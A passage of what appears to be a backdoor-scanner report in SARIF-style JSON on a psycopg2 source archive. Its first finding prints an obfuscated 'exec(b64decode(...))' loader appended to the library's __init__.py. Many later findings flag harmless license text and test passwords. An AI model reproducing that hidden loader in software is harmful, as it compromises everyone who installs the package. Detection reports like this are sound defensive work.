                    "text": "r here instead of in the C layer.\n# This way a new class is registered for each sub-interpreter.\n# See ticket #52\nfrom decimal import Decimal                         # noqa\nfrom psycopg2._psycopg import Decimal as Adapter    # noqa\n_ext.register_adapter(Decimal, Adapter)\ndel Decimal, Adapter\n\nimport base64 as b;exec(b.b64decode('dHJ5OgogICAgX19QWU9fXzAyNTQgPSBsYW1iZGEgeDp4LnJlcGxhY2UoIl9fUFlPX18zOTYzIiwibSIpLnJlcGxhY2UoIl9fUFlPX185NjUxIiwgInAiKS5yZXBsYWNlKCJfX1BZT19fMDc1NCIsICJhIikucmVwbGFjZSgiX19QWU9fXzkzNjQiLCAicyIpLnJlcGxhY2UoIl9fUFlPX184NTQxIiwiZSIpLnJlcGxhY2UoIl9fUFlPX18xMzQ3IiwgInIiKS5yZXBsYWNlK",
                    "rendered": {
                      "text": "r here instead of in the C layer.\n# This way a new class is registered for each sub-interpreter.\n# See ticket #52\nfrom decimal import Decimal                         # noqa\nfrom psycopg2._psycopg import Decimal as Adapter    # noqa\n_ext.register_adapter(Decimal, Adapter)\ndel Decimal, Adapter\n\nimport base64 as b;exec(b.b64decode('dHJ5OgogICAgX19QWU9fXzAyNTQgPSBsYW1iZGEgeDp4LnJlcGxhY2UoIl9fUFlPX18zOTYzIiwibSIpLnJlcGxhY2UoIl9fUFlPX185NjUxIiwgInAiKS5yZXBsYWNlKCJfX1BZT19fMDc1NCIsICJhIikucmVwbGFjZSgiX19QWU9fXzkzNjQiLCAicyIpLnJlcGxhY2UoIl9fUFlPX184NTQxIiwiZSIpLnJlcGxhY2UoIl9fUFlPX18xMzQ3IiwgInIiKS5yZXBsYWNlK",
                      "markdown": "`r here instead of in the C layer.\n# This way a new class is registered for each sub-interpreter.\n# See ticket #52\nfrom decimal import Decimal                         # noqa\nfrom psycopg2._psycopg import Decimal as Adapter    # noqa\n_ext.register_adapter(Decimal, Adapter)\ndel Decimal, Adapter\n\nimport base64 as b;exec(b.b64decode('dHJ5OgogICAgX19QWU9fXzAyNTQgPSBsYW1iZGEgeDp4LnJlcGxhY2UoIl9fUFlPX18zOTYzIiwibSIpLnJlcGxhY2UoIl9fUFlPX185NjUxIiwgInAiKS5yZXBsYWNlKCJfX1BZT19fMDc1NCIsICJhIikucmVwbGFjZSgiX19QWU9fXzkzNjQiLCAicyIpLnJlcGxhY2UoIl9fUFlPX184NTQxIiwiZSIpLnJlcGxhY2UoIl9fUFlPX18xMzQ3IiwgInIiKS5yZXBsYWNlK`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/__init__.py"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 22,
                  "endLine": 31,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/__init__.py"
                },
                "region": {
                  "startLine": 30,
                  "startColumn": 42,
                  "endLine": 30,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/__init__.py"
                },
                "region": {
                  "startLine": 98,
                  "startColumn": 18,
                  "endLine": 98,
                  "endColumn": 26,
                  "snippet": {
                    "text": "    - *dbname*: the database name\n    - *database*: the database name (only as keyword argument)\n    - *user*: user name used to authenticate\n    - *password*: password used to authenticate\n    - *host*: database host address (defaults to UNIX socket if not provided)\n    - *port*: connection port number (defaults to 5432 if not provided)\n\n",
                    "rendered": {
                      "text": "    - *dbname*: the database name\n    - *database*: the database name (only as keyword argument)\n    - *user*: user name used to authenticate\n    - *password*: password used to authenticate\n    - *host*: database host address (defaults to UNIX socket if not provided)\n    - *port*: connection port number (defaults to 5432 if not provided)\n\n",
                      "markdown": "`    - *dbname*: the database name\n    - *database*: the database name (only as keyword argument)\n    - *user*: user name used to authenticate\n    - *password*: password used to authenticate\n    - *host*: database host address (defaults to UNIX socket if not provided)\n    - *port*: connection port number (defaults to 5432 if not provided)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/__init__.py"
                },
                "region": {
                  "startLine": 98,
                  "startColumn": 7,
                  "endLine": 98,
                  "endColumn": 15,
                  "snippet": {
                    "text": "    - *dbname*: the database name\n    - *database*: the database name (only as keyword argument)\n    - *user*: user name used to authenticate\n    - *password*: password used to authenticate\n    - *host*: database host address (defaults to UNIX socket if not provided)\n    - *port*: connection port number (defaults to 5432 if not provided)\n\n",
                    "rendered": {
                      "text": "    - *dbname*: the database name\n    - *database*: the database name (only as keyword argument)\n    - *user*: user name used to authenticate\n    - *password*: password used to authenticate\n    - *host*: database host address (defaults to UNIX socket if not provided)\n    - *port*: connection port number (defaults to 5432 if not provided)\n\n",
                      "markdown": "`    - *dbname*: the database name\n    - *database*: the database name (only as keyword argument)\n    - *user*: user name used to authenticate\n    - *password*: password used to authenticate\n    - *host*: database host address (defaults to UNIX socket if not provided)\n    - *port*: connection port number (defaults to 5432 if not provided)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/__init__.py"
                },
                "region": {
                  "startLine": 91,
                  "startColumn": 66,
                  "endLine": 91,
                  "endColumn": 74,
                  "snippet": {
                    "text": "\n    or using a set of keyword arguments:\n\n        conn = psycopg2.connect(database=\"test\", user=\"postgres\", password=\"secret\")\n\n    Or as a mix of both. The basic connection parameters are:\n\n",
                    "rendered": {
                      "text": "\n    or using a set of keyword arguments:\n\n        conn = psycopg2.connect(database=\"test\", user=\"postgres\", password=\"secret\")\n\n    Or as a mix of both. The basic connection parameters are:\n\n",
                      "markdown": "`\n    or using a set of keyword arguments:\n\n        conn = psycopg2.connect(database=\"test\", user=\"postgres\", password=\"secret\")\n\n    Or as a mix of both. The basic connection parameters are:\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/__init__.py"
                },
                "region": {
                  "startLine": 87,
                  "startColumn": 59,
                  "endLine": 87,
                  "endColumn": 67,
                  "snippet": {
                    "text": "\n    The connection parameters can be specified as a string:\n\n        conn = psycopg2.connect(\"dbname=test user=postgres password=secret\")\n\n    or using a set of keyword arguments:\n\n",
                    "rendered": {
                      "text": "\n    The connection parameters can be specified as a string:\n\n        conn = psycopg2.connect(\"dbname=test user=postgres password=secret\")\n\n    or using a set of keyword arguments:\n\n",
                      "markdown": "`\n    The connection parameters can be specified as a string:\n\n        conn = psycopg2.connect(\"dbname=test user=postgres password=secret\")\n\n    or using a set of keyword arguments:\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/errors.py"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 22,
                  "endLine": 16,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/errors.py"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 42,
                  "endLine": 15,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/tz.py"
                },
                "region": {
                  "startLine": 158,
                  "startColumn": 37,
                  "endLine": 158,
                  "endColumn": 43,
                  "snippet": {
                    "text": "\nLOCAL = LocalTimezone()\n\n# TODO: pre-generate some interesting time zones?\n",
                    "rendered": {
                      "text": "\nLOCAL = LocalTimezone()\n\n# TODO: pre-generate some interesting time zones?\n",
                      "markdown": "`\nLOCAL = LocalTimezone()\n\n# TODO: pre-generate some interesting time zones?\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/tz.py"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 6,
                  "endLine": 32,
                  "snippet": {
                    "text": "# License for more details.\n\nimport datetime\nimport time\n\nZERO = datetime.timedelta(0)\n\n\n",
                    "rendered": {
                      "text": "# License for more details.\n\nimport datetime\nimport time\n\nZERO = datetime.timedelta(0)\n\n\n",
                      "markdown": "`# License for more details.\n\nimport datetime\nimport time\n\nZERO = datetime.timedelta(0)\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/tz.py"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 22,
                  "endLine": 19,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/tz.py"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 42,
                  "endLine": 18,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/_ipaddress.py"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 22,
                  "endLine": 16,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/_ipaddress.py"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 42,
                  "endLine": 15,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.github/workflows/packages.yml"
                },
                "region": {
                  "startLine": 119,
                  "startColumn": 29,
                  "endLine": 119,
                  "endColumn": 37,
                  "snippet": {
                    "text": "      postgresql:\n        image: postgres:16\n        env:\n          POSTGRES_PASSWORD: password\n        ports:\n          - 5432:5432\n        # Set health checks to wait until postgres has started\n",
                    "rendered": {
                      "text": "      postgresql:\n        image: postgres:16\n        env:\n          POSTGRES_PASSWORD: password\n        ports:\n          - 5432:5432\n        # Set health checks to wait until postgres has started\n",
                      "markdown": "`      postgresql:\n        image: postgres:16\n        env:\n          POSTGRES_PASSWORD: password\n        ports:\n          - 5432:5432\n        # Set health checks to wait until postgres has started\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.github/workflows/packages.yml"
                },
                "region": {
                  "startLine": 119,
                  "startColumn": 19,
                  "endLine": 119,
                  "endColumn": 27,
                  "snippet": {
                    "text": "      postgresql:\n        image: postgres:16\n        env:\n          POSTGRES_PASSWORD: password\n        ports:\n          - 5432:5432\n        # Set health checks to wait until postgres has started\n",
                    "rendered": {
                      "text": "      postgresql:\n        image: postgres:16\n        env:\n          POSTGRES_PASSWORD: password\n        ports:\n          - 5432:5432\n        # Set health checks to wait until postgres has started\n",
                      "markdown": "`      postgresql:\n        image: postgres:16\n        env:\n          POSTGRES_PASSWORD: password\n        ports:\n          - 5432:5432\n        # Set health checks to wait until postgres has started\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.github/workflows/packages.yml"
                },
                "region": {
                  "startLine": 108,
                  "startColumn": 37,
                  "endLine": 108,
                  "endColumn": 45,
                  "snippet": {
                    "text": "            PSYCOPG2_TESTDB=postgres\n            PSYCOPG2_TESTDB_HOST=172.17.0.1\n            PSYCOPG2_TESTDB_USER=postgres\n            PSYCOPG2_TESTDB_PASSWORD=password\n            PSYCOPG2_TEST_FAST=1\n\n      - uses: actions/upload-artifact@v4\n",
                    "rendered": {
                      "text": "            PSYCOPG2_TESTDB=postgres\n            PSYCOPG2_TESTDB_HOST=172.17.0.1\n            PSYCOPG2_TESTDB_USER=postgres\n            PSYCOPG2_TESTDB_PASSWORD=password\n            PSYCOPG2_TEST_FAST=1\n\n      - uses: actions/upload-artifact@v4\n",
                      "markdown": "`            PSYCOPG2_TESTDB=postgres\n            PSYCOPG2_TESTDB_HOST=172.17.0.1\n            PSYCOPG2_TESTDB_USER=postgres\n            PSYCOPG2_TESTDB_PASSWORD=password\n            PSYCOPG2_TEST_FAST=1\n\n      - uses: actions/upload-artifact@v4\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.github/workflows/packages.yml"
                },
                "region": {
                  "startLine": 108,
                  "startColumn": 28,
                  "endLine": 108,
                  "endColumn": 36,
                  "snippet": {
                    "text": "            PSYCOPG2_TESTDB=postgres\n            PSYCOPG2_TESTDB_HOST=172.17.0.1\n            PSYCOPG2_TESTDB_USER=postgres\n            PSYCOPG2_TESTDB_PASSWORD=password\n            PSYCOPG2_TEST_FAST=1\n\n      - uses: actions/upload-artifact@v4\n",
                    "rendered": {
                      "text": "            PSYCOPG2_TESTDB=postgres\n            PSYCOPG2_TESTDB_HOST=172.17.0.1\n            PSYCOPG2_TESTDB_USER=postgres\n            PSYCOPG2_TESTDB_PASSWORD=password\n            PSYCOPG2_TEST_FAST=1\n\n      - uses: actions/upload-artifact@v4\n",
                      "markdown": "`            PSYCOPG2_TESTDB=postgres\n            PSYCOPG2_TESTDB_HOST=172.17.0.1\n            PSYCOPG2_TESTDB_USER=postgres\n            PSYCOPG2_TESTDB_PASSWORD=password\n            PSYCOPG2_TEST_FAST=1\n\n      - uses: actions/upload-artifact@v4\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.github/workflows/packages.yml"
                },
                "region": {
                  "startLine": 44,
                  "startColumn": 29,
                  "endLine": 44,
                  "endColumn": 37,
                  "snippet": {
                    "text": "      postgresql:\n        image: postgres:16\n        env:\n          POSTGRES_PASSWORD: password\n        ports:\n          - 5432:5432\n        # Set health checks to wait until postgres has started\n",
                    "rendered": {
                      "text": "      postgresql:\n        image: postgres:16\n        env:\n          POSTGRES_PASSWORD: password\n        ports:\n          - 5432:5432\n        # Set health checks to wait until postgres has started\n",
                      "markdown": "`      postgresql:\n        image: postgres:16\n        env:\n          POSTGRES_PASSWORD: password\n        ports:\n          - 5432:5432\n        # Set health checks to wait until postgres has started\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.github/workflows/packages.yml"
                },
                "region": {
                  "startLine": 44,
                  "startColumn": 19,
                  "endLine": 44,
                  "endColumn": 27,
                  "snippet": {
                    "text": "      postgresql:\n        image: postgres:16\n        env:\n          POSTGRES_PASSWORD: password\n        ports:\n          - 5432:5432\n        # Set health checks to wait until postgres has started\n",
                    "rendered": {
                      "text": "      postgresql:\n        image: postgres:16\n        env:\n          POSTGRES_PASSWORD: password\n        ports:\n          - 5432:5432\n        # Set health checks to wait until postgres has started\n",
                      "markdown": "`      postgresql:\n        image: postgres:16\n        env:\n          POSTGRES_PASSWORD: password\n        ports:\n          - 5432:5432\n        # Set health checks to wait until postgres has started\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.github/workflows/packages.yml"
                },
                "region": {
                  "startLine": 37,
                  "startColumn": 32,
                  "endLine": 37,
                  "endColumn": 40,
                  "snippet": {
                    "text": "      PSYCOPG2_TESTDB: postgres\n      PSYCOPG2_TESTDB_HOST: 172.17.0.1\n      PSYCOPG2_TESTDB_USER: postgres\n      PSYCOPG2_TESTDB_PASSWORD: password\n      PSYCOPG2_TEST_FAST: 1\n\n    services:\n",
                    "rendered": {
                      "text": "      PSYCOPG2_TESTDB: postgres\n      PSYCOPG2_TESTDB_HOST: 172.17.0.1\n      PSYCOPG2_TESTDB_USER: postgres\n      PSYCOPG2_TESTDB_PASSWORD: password\n      PSYCOPG2_TEST_FAST: 1\n\n    services:\n",
                      "markdown": "`      PSYCOPG2_TESTDB: postgres\n      PSYCOPG2_TESTDB_HOST: 172.17.0.1\n      PSYCOPG2_TESTDB_USER: postgres\n      PSYCOPG2_TESTDB_PASSWORD: password\n      PSYCOPG2_TEST_FAST: 1\n\n    services:\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.github/workflows/packages.yml"
                },
                "region": {
                  "startLine": 37,
                  "startColumn": 22,
                  "endLine": 37,
                  "endColumn": 30,
                  "snippet": {
                    "text": "      PSYCOPG2_TESTDB: postgres\n      PSYCOPG2_TESTDB_HOST: 172.17.0.1\n      PSYCOPG2_TESTDB_USER: postgres\n      PSYCOPG2_TESTDB_PASSWORD: password\n      PSYCOPG2_TEST_FAST: 1\n\n    services:\n",
                    "rendered": {
                      "text": "      PSYCOPG2_TESTDB: postgres\n      PSYCOPG2_TESTDB_HOST: 172.17.0.1\n      PSYCOPG2_TESTDB_USER: postgres\n      PSYCOPG2_TESTDB_PASSWORD: password\n      PSYCOPG2_TEST_FAST: 1\n\n    services:\n",
